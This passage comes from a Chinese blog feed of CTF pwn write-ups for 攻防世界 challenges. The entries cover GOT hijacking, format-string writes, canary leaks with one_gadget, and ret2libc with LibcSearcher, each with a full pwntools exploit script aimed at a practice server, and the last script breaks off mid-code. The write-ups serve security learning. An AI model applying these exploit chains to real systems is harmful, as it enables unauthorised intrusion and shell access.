href="#0x02-got表劫持" class="headerlink" title="0x02 got表劫持"></a>0x02 got表劫持</h2><p>为了实现以上想法我们想要构造这样的一条链：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span>READONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因为没有open函数，我们又知道open函数是由syscall调用的，调用号为2，且给出的函数中alarm没有用它也是被syscall调用的于是我们想到改写alarm函数的got表保存的地址使它指向syscall<br>我们用pwndbg查看一下alarm函数的反汇编代码：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/3.png"><br>那个endbr64不用管他，函数从它下面开始，也就是syscall离alarm调用处偏移了5，我们要将这个5加上去，<strong>（这里是经验快记）</strong>所以我们要找一个<strong>add [寄存器]，寄存器</strong> 类型的garget<br>用ropper查找：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/4.png"><br>我们选择这个garget，因为rdi比较常见且它比较简单操作<br>搜索我们要的其他garget：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/5.png"><br>这里都有<br>flag字符串可以在字符串窗口找到，但要设置下显示长度要不然可能找不到<br>先右击任意位置打开选择setup，将下面那个设置成4，那个是最小长度显示<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/6.png"><br>上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">55003</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./recho"</span><span class="token punctuation">)</span>read_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>alarm_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"alarm"</span><span class="token punctuation">]</span>alarm_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"alarm"</span><span class="token punctuation">]</span>flag_addr<span class="token operator">=</span><span class="token number">0x0601058</span>pop_rax<span class="token operator">=</span><span class="token number">0x04006fc</span>pop_rdi<span class="token operator">=</span><span class="token number">0x04008a3</span>pop_rdx<span class="token operator">=</span><span class="token number">0x04006fe</span>pop_rsi_r15<span class="token operator">=</span><span class="token number">0x04008a1</span>add_rdi<span class="token operator">=</span><span class="token number">0x040070d</span>bss_addr<span class="token operator">=</span><span class="token number">0x0601060</span><span class="token comment">#bss段具有可读写权限，将flag存这</span><span class="token comment">#溢出0x38覆盖至rbp，并改写alarm的got表存储的地址</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>alarm_got<span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>add_rdi<span class="token punctuation">)</span><span class="token comment">#构造open函数</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>alarm_plt<span class="token punctuation">)</span><span class="token comment">#构造read函数，open以后，fd的值一般是3开始，依次增加。比如我open了两个文件，那么它们的fd分别为3和4。如果特殊，</span><span class="token comment">#具体看调试结果</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token comment">#构造write函数，把读取到的flag打印出来</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Welcome to Recho server!\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得flag：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/7.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界——实时数据监测</title>
      <link href="/2023/01/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/"/>
      <url>/2023/01/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界——实时数据监测"><a href="#攻防世界——实时数据监测" class="headerlink" title="攻防世界——实时数据监测"></a>攻防世界——实时数据监测</h1><p>这题思路很简单，难度大大降低了，本来是一道盲打题，但给了文件就很清晰了，主要是记录一下一个pwntools的新用法<br>checksec：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/1.png"><br>看到没开任何保护，经验就告诉我，这是一道盲打改编题。<br>拖进IDA：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/2.png"><br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/3.png"><br>逻辑很简单知道吧key赋值成0x2223322就可以获得shell<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/4.png"><br>这里也很清楚是个格式化字符串漏洞<br>连接靶机看看偏移量：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/6.png"><br>偏移量为12<br>这里讲一讲要用到的pwntools：fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;’byte’)<br>实际上我们常用的形式是<strong>fmtstr_payload(offset, {printf_got: system_addr})(偏移，{原地址：目的地址})</strong><br>比如我要更改puts函数got表中的实际地址为system的实际地址，且偏移量为12，我可以这么写：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">fmtstr_payload<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>puts_got<span class="token punctuation">:</span>system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">#这里是变量名</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以实现真正的<strong>任意内存地址写</strong><br>上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">58121</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">0x804A048</span><span class="token punctuation">:</span><span class="token number">0x2223322</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得shell：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/5.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn1细节分析</title>
      <link href="/2023/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/"/>
      <url>/2023/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="babystack-wp"><a href="#babystack-wp" class="headerlink" title="babystack-wp"></a>babystack-wp</h2><p>对于这题和pwn-100的思路很像，也是一道retlibc3的题目，这题也学到了很多，故写一篇博客记录一下。<br>老样子checksec一下：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/1.png"><br>开了Canary、NX和RELRO无法改写got表<br>拖进IDA查看：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/2.png"><br>有两个函数被调用，一个是列表、一个是给v3赋值<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/3.png"><br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/4.png"><br>函数逻辑很简单，溢出点也很明显，但是没有system函数和&#x2F;bin&#x2F;sh字符串比较麻烦又是retlibc3类型<br>但是这题和pwn-100不一样的是他给了libc-2.23.so文件，意味着我们不用LibcSearcher去寻找靶机的libc版本，比较方便但是他开了canary保护比较难整<br>这里又要讲一个新方法，原理不难可以说很好理解，但要了解pwntools的一些细节。</p><h3 id="利用栈溢出泄露Canary"><a href="#利用栈溢出泄露Canary" class="headerlink" title="利用栈溢出泄露Canary"></a>利用栈溢出泄露Canary</h3><p>前提输入完后，最好有一个puts函数跟在下面把栈中内容输出。<br>这里v6就是Canary离栈底差8h，而s离栈底差90h二者相差88h，我们只要输入0x88个a就可以了，这边是个细节：有人会问为什么0x88就可以，明明没覆盖到canary<br>因为sendline是<strong>发送一行数据</strong>，所以会在<strong>末尾自动补个\n</strong>，而<strong>\n就是\0a正好覆盖到canary的低字节\00</strong>，本来puts碰到\00就会停止读取覆盖为\0a<br>就可以将Canary视为s的一部分一起打印出来，就可以泄露。</p><h3 id="one-garget的使用"><a href="#one-garget的使用" class="headerlink" title="one_garget的使用"></a>one_garget的使用</h3><p>泄露完Canary后面思路都是老套路了，这里给了libc-2.23.so要如何用呢？这里有涉及到一个工具one_gadget<br>安装如下：</p><pre class="line-numbers language-none"><code class="language-none">sudo apt -y install rubysudo gem install one_gadget<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/5.png"><br>one_gadget就是用来去查找动态链接库里execve(“&#x2F;bin&#x2F;sh”, rsp+0x70, environ)函数的<strong>偏移地址</strong>的，还是很好用的。<br><strong>注意是找偏移地址</strong>实际的libc地址还是要自己算。<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/6.png"><br>ropper找到pop rdi;ret;<br>上exp讲解：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">58094</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span><span class="token comment">#这就是格式记住</span>puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main_addr<span class="token operator">=</span><span class="token number">0x0400908</span>pop_rdi<span class="token operator">=</span><span class="token number">0x0400a93</span>one_gadget<span class="token operator">=</span><span class="token number">0x45216</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x88</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token comment">#因为sendline自己会补\n，所以要添上“\n”（网上都不讲的，想了半天）</span>canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#先接收7个字节，如果不够从低字节用\x00补齐到8字节</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#打印看会不会收错</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token comment">#泄露puts的真实地址</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span> <span class="token comment">#64位传参格式：参数(rdi、rsi、rdx……(6个)可能)+函数地址（plt）+预留返回地址</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    <span class="token comment">#32位传参格式：函数地址（plt）+预留返回地址+参数(栈空间)  </span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token comment">#这里一定要输入3退出才能执行return，才会执行rop链，以前的题目做好rop输入就可以，这题没想到要手动退出卡了好久</span>puts_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#接收8个字节，如果不够高字节用\x00补齐</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>flag<span class="token operator">=</span>one_gadget<span class="token operator">+</span>libc_basepayload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token comment">#记得退出</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取shell：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/7.png"><br>附注覆盖图：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/8.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界——monkey</title>
      <link href="/2023/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94monkey/"/>
      <url>/2023/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94monkey/</url>
      
        <content type="html"><![CDATA[<h1 id="这是一种很新的monkey……"><a href="#这是一种很新的monkey……" class="headerlink" title="这是一种很新的monkey……"></a>这是一种很新的monkey……</h1><p>本来不打算写这题的博客的，<del>也不知道要这么写</del>  但还是想记录一下，毕竟是新题型，不知道常不常见……<br>checksec一下：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94monkey/1.png"><br>发现没什么异常，估计是栈溢出。<br>但是拖进IDA查看时，人麻了，IDA解析了半天给出了长长的函数块，main函数里更别说了……<br>又是在做一种很新的题目，分析不了怎么办……只能求助带佬了</p><h2 id="javascript解释器"><a href="#javascript解释器" class="headerlink" title="javascript解释器"></a>javascript解释器</h2><p>带佬说这是个javascript解释器（js解释器），这题就相当于一个终端，可以直接输入命令，获取回应，如果直接输入system（“&#x2F;bin&#x2F;sh”）就会直接执行获取shell。<br>这里带入网上的解释：<br>JavaScript解释器又名js引擎。</p><p>JavaScript是解释型语言，这就是说它无需编译，直接由JavaScript引擎直接执行。</p><p>既然说到了解释型语言，那么我们就来分别以下解释型语言和编译型语言的差别：</p><p>编译型语言：程序在执行之前需要一个专门的编译过程，把程序编译成为机器语言的文件（即exe文件），运行时不需要重新编译，直接用编译后的文件（exe文件）就行了。<br>优点：执行效率高<br>缺点：跨平台性差<br>解释型语言：程序不需要编译，程序在运行的过程中才用解释器编译成机器语言，边编译边执行（没有exe文件）。<br>优点：跨平台性好<br>缺点：执行效率低<br>其中程序无需编译，不是说真的不需要编译了，直接执行脚本字符串。而是说不需要在运行之前先编译程序成为exe文件，而是在运行的过程中边运行边执行。</p><h2 id="os-system-“-x2F-bin-x2F-sh”"><a href="#os-system-“-x2F-bin-x2F-sh”" class="headerlink" title="os.system(“&#x2F;bin&#x2F;sh”)"></a>os.system(“&#x2F;bin&#x2F;sh”)</h2><p><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94monkey/2.png"><br>直接输入system(“&#x2F;bin&#x2F;sh”)会发现不会有任何回应，看带佬们用了os.system，这里我就不说了去网上查查吧（我也不清楚，本人太菜了）<br>所以连最终连exp都不用写直接操作就行：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94monkey/3.png"><br>结束</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高级rop-retlibc3心得</title>
      <link href="/2023/01/06/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/"/>
      <url>/2023/01/06/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界-pwn-100-wp"><a href="#攻防世界-pwn-100-wp" class="headerlink" title="攻防世界 pwn-100 wp"></a>攻防世界 pwn-100 wp</h1><p>这里要记录三种新的知识：一种是retlibc3和LibSearcher库的应用以及exp的新语法<br>checksec一下：<br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/1.png"><br>64位文件，只开了NX保护只可能是栈溢出了。<br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/2.png"><br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/3.png"><br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/4.png"><br>这里的代码不长一步一步看下去，是一个嵌套性函数。<br>查看发现没有任何后门函数可利用，比较棘手。<br>按shift+F12查看字符串窗口：<br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/5.png"><br>没有&#x2F;bin&#x2F;sh字符串，可判断为retlibc3类型。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h2><pre class="line-numbers language-none"><code class="language-none">1、有system（“&#x2F;bin&#x2F;sh”）则为retlibc类型2、有system（“……”）但没有&#x2F;bin&#x2F;sh字符串为retlibc2类型3、没有system（“……”）也没有&#x2F;bin&#x2F;sh字符串为retlibc3类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>前两种都挺好做，第三种属于是进阶了。<br>我们需要泄露出 libc 中某个函数的地址，从而根据偏移来获得 system 和 ‘&#x2F;bin&#x2F;sh’ 的地址并调用之，但是和之前的题不同我们并没有 libc 的样本，也就无从得知具体的偏移；我们在调用一个函数时，<br>需要控制一些寄存器的值（64位的调用规约规定前6个参数放在寄存器中），这里的解决方式是利用 gadget ；并且要使用 LibcSearcher 库<br>LibcSearcher安装方式：</p><pre class="line-numbers language-none"><code class="language-none">--- git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git--- cd LibcSearcher--- python3 setup.py develop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>具体报错上网搜索即可。<br>对于garget的搜索我用的是ropper：<br><img src="/images/%E9%AB%98%E7%BA%A7rop-retlibc3%E5%BF%83%E5%BE%97/6.png"><br>所以我们最终的思路是，调用 puts 函数来获得某个库函数的地址（这里选用 puts 函数），调用时使用 gadget 来控制寄存器从而传递参数，然后利用 LibcSearcher 来获得 system 和 &#x2F;bin&#x2F;sh 的<br>地址，用它们覆盖返回地址后使程序的流程到达之，从而开启 interactive 模式<br>上exp：（这个exp是模仿别人的但是整体是自己写的，但不知道为什么失灵时不灵的）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">61254</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn-100'</span><span class="token punctuation">)</span>pop_rdi_ret<span class="token operator">=</span><span class="token number">0x0400763</span>put_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>put_got<span class="token operator">=</span>elf<span class="token 